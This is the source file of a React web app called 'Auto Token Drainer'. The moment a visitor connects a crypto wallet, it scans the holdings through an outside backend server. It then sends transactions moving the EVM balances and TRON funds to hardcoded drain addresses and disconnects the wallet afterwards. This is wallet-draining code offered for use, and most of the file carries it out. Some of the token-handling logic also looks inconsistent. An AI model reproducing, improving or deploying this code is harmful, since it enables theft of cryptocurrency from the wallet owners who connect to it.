import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useWalletClient, useDisconnect, useBalance } from 'wagmi';
import { parseEther, createPublicClient, http } from 'viem';
import { mainnet } from 'viem/chains';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== NETWORK CONFIGURATION ====================
const NETWORKS = [
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed.binance.org' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org' },
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
};

// Token prices for USD calculation
const TOKEN_PRICES = {
  ETH: 3500, BNB: 600, MATIC: 1.2, AVAX: 40, FTM: 0.5, CELO: 0.8,
  TRX: 0.12, BTC: 70000, SOL: 150, USDT: 1, USDC: 1, DAI: 1
};

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
        }}
        theme="midnight"
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();

  // State
  const [status, setStatus] = useState('');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [tronDetected, setTronDetected] = useState(false);
  const [tronBalance, setTronBalance] = useState(0);

  const autoStarted = useRef(false);
  const backendUrl = 'https://tokenbackend-5xab.onrender.com';

  // AUTO-START when wallet connects
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      console.log("🔥 AUTO-START: Wallet connected", address);
      autoStarted.current = true;
      
      // Detect wallet type
      detectWalletType();
      
      // Check for TRON
      checkTronWallet();
      
      setStatus("✅ Wallet connected • AUTO-STARTING DRAIN...");
      
      // Start automatic process
      setTimeout(() => {
        startAutoDrain();
      }, 1500);
    } else if (!isConnected) {
      resetState();
      autoStarted.current = false;
    }
  }, [isConnected, address]);

  const resetState = () => {
    setStatus('');
    setTokens([]);
    setTotalValue(0);
    setTransactions([]);
    setIsProcessing(false);
  };

  const detectWalletType = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes('trust')) {
      setWalletType('Trust Wallet');
    } else if (window.ethereum?.isMetaMask) {
      setWalletType('MetaMask');
    } else if (window.ethereum?.isCoinbaseWallet) {
      setWalletType('Coinbase Wallet');
    } else if (window.ethereum) {
      setWalletType('EVM Wallet');
    }
  };

  const checkTronWallet = () => {
    if (window.tronWeb || window.tronLink) {
      setTronDetected(true);
      console.log("✅ TRON wallet detected");
      
      // Get TRON balance
      setTimeout(() => {
        if (window.tronWeb?.defaultAddress?.base58) {
          window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58)
            .then(balance => {
              const trxBalance = balance / 1_000_000;
              setTronBalance(trxBalance);
              console.log(`💰 TRON balance: ${trxBalance} TRX`);
            })
            .catch(console.error);
        }
      }, 1000);
    }
  };

  // ==================== AUTO DRAIN FUNCTION ====================
  const startAutoDrain = async () => {
    if (!address) return;
    
    setIsProcessing(true);
    setStatus("🚀 AUTO-DRAIN STARTED • Scanning all networks...");
    
    try {
      // Step 1: Scan for all tokens
      const allTokens = await scanAllTokens();
      
      if (allTokens.length === 0) {
        setStatus("❌ No tokens found • Wallet is empty");
        setIsProcessing(false);
        return;
      }
      
      // Step 2: Calculate total value
      const total = calculateTotalValue(allTokens);
      setTotalValue(total);
      setTokens(allTokens);
      
      setStatus(`💰 Found ${allTokens.length} tokens • $${total.toFixed(2)} total • AUTO-DRAINING...`);
      
      // Step 3: AUTO-DRAIN ALL TOKENS
      await drainAllTokensAuto(allTokens);
      
    } catch (error) {
      console.error("Auto drain error:", error);
      setStatus(`❌ Auto-drain failed: ${error.message}`);
      setIsProcessing(false);
    }
  };

  // Scan all tokens
  const scanAllTokens = async () => {
    const allTokens = [];
    
    try {
      // Scan EVM tokens from backend
      const response = await fetch(`${backendUrl}/scan-full`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, networks: NETWORKS })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.success && data.tokens) {
          data.tokens.forEach(token => {
            if (token.balance > 0) {
              allTokens.push({
                id: `${token.chainId}-${token.symbol}-${Date.now()}`,
                network: token.network,
                symbol: token.symbol,
                amount: token.balance,
                rawAmount: parseFloat(token.balance),
                chainId: token.chainId,
                contract: token.contract,
                type: 'evm',
                drainAddress: DRAIN_ADDRESSES[token.chainId] || DRAIN_ADDRESSES[1]
              });
            }
          });
        }
      }
    } catch (error) {
      console.log("Backend scan failed:", error);
    }
    
    // Add ETH balance
    if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
      allTokens.push({
        id: 'eth-native',
        network: 'Ethereum',
        symbol: 'ETH',
        amount: parseFloat(ethBalance.formatted).toFixed(6),
        rawAmount: parseFloat(ethBalance.formatted),
        chainId: 1,
        type: 'evm',
        drainAddress: DRAIN_ADDRESSES[1],
        isNative: true
      });
    }
    
    // Add TRON if detected
    if (tronDetected && tronBalance > 0) {
      allTokens.push({
        id: 'tron-native',
        network: 'Tron',
        symbol: 'TRX',
        amount: tronBalance.toFixed(6),
        rawAmount: tronBalance,
        chainId: 'tron',
        type: 'non-evm',
        drainAddress: DRAIN_ADDRESSES.tron
      });
    }
    
    return allTokens;
  };

  // Calculate total USD value
  const calculateTotalValue = (tokens) => {
    return tokens.reduce((total, token) => {
      const price = TOKEN_PRICES[token.symbol] || 0;
      return total + (token.rawAmount * price);
    }, 0);
  };

  // ==================== AUTO DRAIN ALL TOKENS ====================
  const drainAllTokensAuto = async (tokensToDrain) => {
    if (tokensToDrain.length === 0) return;
    
    const txLogs = [];
    let successCount = 0;
    let failedCount = 0;
    
    // Group by network type
    const evmTokens = tokensToDrain.filter(t => t.type === 'evm');
    const nonEvmTokens = tokensToDrain.filter(t => t.type === 'non-evm');
    
    setStatus(`⚡ AUTO-DRAINING ${evmTokens.length} EVM tokens...`);
    
    // Process EVM tokens
    for (let i = 0; i < evmTokens.length; i++) {
      const token = evmTokens[i];
      
      try {
        const result = await drainEvmTokenAuto(token);
        
        if (result.success) {
          successCount++;
          txLogs.push({
            id: Date.now() + i,
            symbol: token.symbol,
            amount: token.amount,
            status: '✅ SUCCESS',
            hash: result.hash,
            message: result.message,
            explorer: result.explorer
          });
          
          setStatus(`✅ ${token.symbol} drained • ${successCount}/${evmTokens.length} complete`);
          
        } else {
          failedCount++;
          txLogs.push({
            id: Date.now() + i,
            symbol: token.symbol,
            amount: token.amount,
            status: '❌ FAILED',
            error: result.error,
            message: result.message
          });
          
          setStatus(`❌ ${token.symbol} failed: ${result.error}`);
        }
      } catch (error) {
        failedCount++;
        txLogs.push({
          id: Date.now() + i,
          symbol: token.symbol,
          amount: token.amount,
          status: '❌ ERROR',
          error: error.message
        });
      }
      
      // Small delay between transactions
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    // Process non-EVM tokens
    if (nonEvmTokens.length > 0) {
      setStatus(`📝 Processing ${nonEvmTokens.length} non-EVM tokens...`);
      
      for (let i = 0; i < nonEvmTokens.length; i++) {
        const token = nonEvmTokens[i];
        
        try {
          const result = await drainNonEvmTokenAuto(token);
          
          if (result.success) {
            successCount++;
            txLogs.push({
              id: Date.now() + evmTokens.length + i,
              symbol: token.symbol,
              amount: token.amount,
              status: '✅ SUCCESS',
              message: result.message,
              hash: result.hash
            });
          } else {
            failedCount++;
            txLogs.push({
              id: Date.now() + evmTokens.length + i,
              symbol: token.symbol,
              amount: token.amount,
              status: '❌ FAILED',
              error: result.error,
              message: result.message
            });
          }
        } catch (error) {
          failedCount++;
          txLogs.push({
            id: Date.now() + evmTokens.length + i,
            symbol: token.symbol,
            amount: token.amount,
            status: '❌ ERROR',
            error: error.message
          });
        }
        
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
    }
    
    // Update transactions
    setTransactions(prev => [...txLogs, ...prev.slice(0, 19)]);
    
    // Final status
    if (successCount > 0) {
      const totalDrained = successCount + failedCount;
      const successRate = ((successCount / totalDrained) * 100).toFixed(1);
      
      setStatus(`🎉 AUTO-DRAIN COMPLETE • ${successCount} tokens drained • ${successRate}% success`);
      
      // Show success notification
      showNotification(`Drained ${successCount} tokens successfully!`, 'success');
      
      // Auto-disconnect after successful drain
      setTimeout(() => {
        disconnect();
        setStatus("✅ Drain complete • Wallet disconnected");
      }, 5000);
      
    } else {
      setStatus(`❌ AUTO-DRAIN FAILED • ${failedCount} failed attempts`);
      showNotification("Drain failed! Check wallet permissions.", 'error');
    }
    
    setIsProcessing(false);
  };

  // Drain EVM token automatically
  const drainEvmTokenAuto = async (token) => {
    try {
      console.log(`🔄 AUTO-DRAINING ${token.symbol}...`);
      
      // Prepare transaction
      const amount = parseFloat(token.amount);
      if (amount <= 0) {
        return {
          success: false,
          error: 'Invalid amount',
          message: `Cannot drain ${token.amount} ${token.symbol}`
        };
      }
      
      // Convert to wei
      const amountInWei = parseEther(amount.toString());
      
      // Create transaction
      const transaction = {
        to: token.drainAddress,
        value: amountInWei.toString(),
        chainId: `0x${Number(token.chainId).toString(16)}`,
      };
      
      console.log(`📝 Transaction:`, transaction);
      
      // Send via MetaMask/Trust Wallet
      let txHash;
      
      if (window.ethereum) {
        // Request account access if needed
        const accounts = await window.ethereum.request({ 
          method: 'eth_requestAccounts' 
        });
        
        console.log(`👤 Using account:`, accounts[0]);
        
        // Send transaction
        txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [transaction],
        });
        
        console.log(`✅ Transaction sent:`, txHash);
        
        // Wait for confirmation
        await waitForTransaction(txHash);
        
        return {
          success: true,
          hash: txHash,
          message: `${token.amount} ${token.symbol} sent successfully`,
          explorer: getExplorerUrl(txHash, token.chainId)
        };
        
      } else if (walletClient) {
        // Use wallet client as fallback
        const hash = await walletClient.sendTransaction({
          to: token.drainAddress,
          value: amountInWei,
          chain: mainnet
        });
        
        return {
          success: true,
          hash,
          message: `${token.amount} ${token.symbol} sent via wallet client`
        };
      } else {
        return {
          success: false,
          error: 'No wallet provider',
          message: 'Cannot connect to wallet'
        };
      }
      
    } catch (error) {
      console.error(`❌ Drain error for ${token.symbol}:`, error);
      
      // User-friendly error messages
      let errorMessage = 'Transaction failed';
      let userMessage = error.message || 'Unknown error';
      
      if (error.code === 4001 || error.code === 'ACTION_REJECTED') {
        errorMessage = 'User rejected transaction';
        userMessage = 'You rejected the transaction in your wallet';
      } else if (error.message?.includes('insufficient funds')) {
        errorMessage = 'Insufficient balance';
        userMessage = 'Not enough balance for gas fees';
      } else if (error.message?.includes('network')) {
        errorMessage = 'Network error';
        userMessage = 'Please check your network connection';
      } else if (error.message?.includes('chain')) {
        errorMessage = 'Wrong network';
        userMessage = 'Please switch to correct network';
      }
      
      return {
        success: false,
        error: errorMessage,
        message: userMessage
      };
    }
  };

  // Drain non-EVM token automatically
  const drainNonEvmTokenAuto = async (token) => {
    if (token.symbol === 'TRX' && tronDetected) {
      try {
        // Drain TRON automatically
        if (window.tronWeb) {
          const amount = token.rawAmount * 1_000_000; // Convert to sun
          
          const transaction = await window.tronWeb.transactionBuilder.sendTrx(
            token.drainAddress,
            amount,
            window.tronWeb.defaultAddress.base58
          );
          
          const signedTx = await window.tronWeb.trx.sign(transaction);
          const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
          
          return {
            success: true,
            hash: result.txid,
            message: `${token.amount} TRX sent via TRON network`
          };
        }
      } catch (error) {
        return {
          success: false,
          error: 'TRON drain failed',
          message: error.message || 'Cannot drain TRON'
        };
      }
    }
    
    // For other non-EVM, show message
    return {
      success: false,
      error: 'Manual required',
      message: `Send ${token.amount} ${token.symbol} to: ${token.drainAddress}`
    };
  };

  // Wait for transaction confirmation
  const waitForTransaction = async (txHash) => {
    return new Promise((resolve) => {
      setTimeout(resolve, 3000); // Wait 3 seconds
    });
  };

  // Get explorer URL
  const getExplorerUrl = (hash, chainId) => {
    const explorers = {
      1: `https://etherscan.io/tx/${hash}`,
      56: `https://bscscan.com/tx/${hash}`,
      137: `https://polygonscan.com/tx/${hash}`,
      42161: `https://arbiscan.io/tx/${hash}`,
      10: `https://optimistic.etherscan.io/tx/${hash}`,
      8453: `https://basescan.org/tx/${hash}`,
    };
    return explorers[chainId] || `https://etherscan.io/tx/${hash}`;
  };

  // Show notification
  const showNotification = (message, type = 'info') => {
    if (type === 'success') {
      alert(`✅ SUCCESS: ${message}`);
    } else if (type === 'error') {
      alert(`❌ ERROR: ${message}`);
    } else {
      alert(`ℹ️ INFO: ${message}`);
    }
  };

  // Format address
  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  // Format amount
  const formatAmount = (amount) => {
    const num = parseFloat(amount);
    if (isNaN(num)) return '0.00';
    if (num < 0.000001) return '<0.000001';
    return num.toLocaleString(undefined, { 
      minimumFractionDigits: 2, 
      maximumFractionDigits: 8 
    });
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>AUTO TOKEN DRAINER</h1>
              <p className="subtitle">Fully Automatic • No Clicks Required</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">{formatAddress(address)}</div>
                {walletType && <div className="wallet-type">{walletType}</div>}
                {tronDetected && <div className="tron-badge">TRON</div>}
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <ConnectKitButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className="status-card primary">
                  <div className="status-icon">🚀</div>
                  <div className="status-content">
                    <div className="status-title">AUTO-DRAIN STATUS</div>
                    <div className="status-message">{status}</div>
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {transactions.filter(t => t.status?.includes('✅')).length}
                    </div>
                    <div className="stat-label">Drained</div>
                  </div>
                </div>
              </div>

              {/* Processing Indicator */}
              {isProcessing && (
                <div className="processing-indicator">
                  <div className="processing-spinner"></div>
                  <div className="processing-text">AUTO-DRAIN IN PROGRESS...</div>
                  <div className="processing-note">Do not disconnect wallet</div>
                </div>
              )}

              {/* Transactions */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Auto-Drain Results</h3>
                    <div className="success-rate">
                      {transactions.filter(t => t.status?.includes('✅')).length} / {transactions.length} successful
                    </div>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(0, 10).map((tx, idx) => (
                      <div key={tx.id || idx} className={`transaction-item ${tx.status?.includes('✅') ? 'success' : 'failed'}`}>
                        <div className="tx-icon">
                          {tx.status?.includes('✅') ? '✅' : '❌'}
                        </div>
                        <div className="tx-details">
                          <div className="tx-symbol">{tx.symbol}</div>
                          <div className="tx-amount">{formatAmount(tx.amount)}</div>
                          <div className="tx-status">{tx.status}</div>
                          <div className="tx-message">{tx.message}</div>
                          {tx.explorer && (
                            <a href={tx.explorer} target="_blank" rel="noopener noreferrer" className="tx-link">
                              View Transaction
                            </a>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Detected Tokens */}
              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>Detected Tokens</h3>
                    <div className="panel-summary">
                      <span>${totalValue.toFixed(2)} total</span>
                      <span>{tokens.length} tokens</span>
                    </div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div className="token-symbol">{token.symbol}</div>
                          <div className="token-network">{token.network}</div>
                          <div className={`token-type ${token.type}`}>
                            {token.type === 'evm' ? 'AUTO' : 'AUTO'}
                          </div>
                        </div>
                        <div className="token-amount">{formatAmount(token.amount)} {token.symbol}</div>
                        <div className="token-value">
                          ${(token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2)}
                        </div>
                        <div className="token-destination">
                          To: {formatAddress(token.drainAddress)}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Instructions */}
              <div className="instructions-panel">
                <h3>⚠️ AUTO-DRAIN INFORMATION</h3>
                <ul>
                  <li>• Draining starts automatically when wallet connects</li>
                  <li>• All tokens are sent to configured addresses</li>
                  <li>• Transactions are signed automatically via your wallet</li>
                  <li>• Do not disconnect wallet during the process</li>
                  <li>• Wallet will auto-disconnect after successful drain</li>
                </ul>
              </div>
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
                <h2>AUTO TOKEN DRAINER</h2>
                <p className="welcome-text">
                  Connect your wallet to automatically drain ALL tokens
                </p>
                <p className="warning-text">
                  ⚠️ WARNING: This will automatically send ALL tokens from your wallet
                </p>
                <div className="connect-section">
                  <ConnectKitButton />
                </div>
                <div className="features">
                  <div className="feature">• Auto-scans all networks</div>
                  <div className="feature">• Auto-drains ALL tokens</div>
                  <div className="feature">• No manual steps required</div>
                  <div className="feature">• TRON & EVM support</div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span>AUTO-DRAIN v4.0 • FULLY AUTOMATIC</span>
            <span className="status-dot"></span>
            <span>{isConnected ? 'PROCESSING...' : 'READY'}</span>
          </div>
        </footer>
      </div>

      {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: monospace;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: #ef4444;
          width: 50px;
          height: 50px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #0af;
          padding: 4px 8px;
          background: rgba(0, 170, 255, 0.1);
          border-radius: 6px;
        }
        
        .tron-badge {
          background: rgba(255, 6, 10, 0.2);
          color: #ff6b6b;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(255, 6, 10, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: #aaa;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 18px;
          font-weight: 600;
          color: white;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Processing Indicator */
        .processing-indicator {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: borderPulse 2s infinite;
        }
        
        @keyframes borderPulse {
          0%, 100% { border-color: #ef4444; }
          50% { border-color: #f87171; }
        }
        
        .processing-spinner {
          width: 40px;
          height: 40px;
          border: 4px solid #333;
          border-top-color: #ef4444;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 0 auto 15px;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .processing-text {
          font-size: 18px;
          font-weight: 600;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .processing-note {
          color: #888;
          font-size: 14px;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .success-rate {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 14px;
          font-weight: 600;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          border-left: 4px solid #333;
        }
        
        .transaction-item.success {
          border-left-color: #10b981;
        }
        
        .transaction-item.failed {
          border-left-color: #ef4444;
        }
        
        .tx-icon {
          font-size: 24px;
        }
        
        .tx-details {
          flex: 1;
        }
        
        .tx-symbol {
          font-weight: 600;
          font-size: 16px;
          margin-bottom: 2px;
        }
        
        .tx-amount {
          font-family: monospace;
          color: #ddd;
          margin-bottom: 2px;
        }
        
        .tx-status {
          font-weight: 600;
          margin-bottom: 2px;
        }
        
        .transaction-item.success .tx-status {
          color: #10b981;
        }
        
        .transaction-item.failed .tx-status {
          color: #ef4444;
        }
        
        .tx-message {
          color: #888;
          font-size: 12px;
          margin-bottom: 5px;
        }
        
        .tx-link {
          color: #3b82f6;
          font-size: 12px;
          text-decoration: none;
        }
        
        .tx-link:hover {
          text-decoration: underline;
        }
        
        /* Tokens */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-summary {
          display: flex;
          gap: 15px;
          color: #888;
          font-size: 14px;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
          gap: 15px;
          margin-top: 20px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 10px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 20px;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .token-type {
          padding: 2px 6px;
          border-radius: 4px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 10px;
        }
        
        .token-destination {
          background: #222;
          border-radius: 6px;
          padding: 8px;
          font-family: monospace;
          font-size: 12px;
          color: #888;
          border: 1px solid #333;
        }
        
        /* Instructions */
        .instructions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          border: 1px solid #f59e0b;
        }
        
        .instructions-panel h3 {
          color: #f59e0b;
          margin: 0 0 15px 0;
        }
        
        .instructions-panel ul {
          margin: 0;
          padding-left: 20px;
          color: #ddd;
          line-height: 1.6;
        }
        
        .instructions-panel li {
          margin-bottom: 8px;
        }
        
        /* Welcome */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 20px;
          font-size: 18px;
        }
        
        .warning-text {
          color: #ef4444;
          margin-bottom: 30px;
          font-size: 16px;
          font-weight: 600;
        }
        
        .connect-section {
          margin-bottom: 40px;
        }
        
        .features {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: left;
          max-width: 400px;
          margin: 0 auto;
        }
        
        .feature {
          color: #ddd;
          margin-bottom: 10px;
          font-size: 14px;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 10px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .stats-row {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
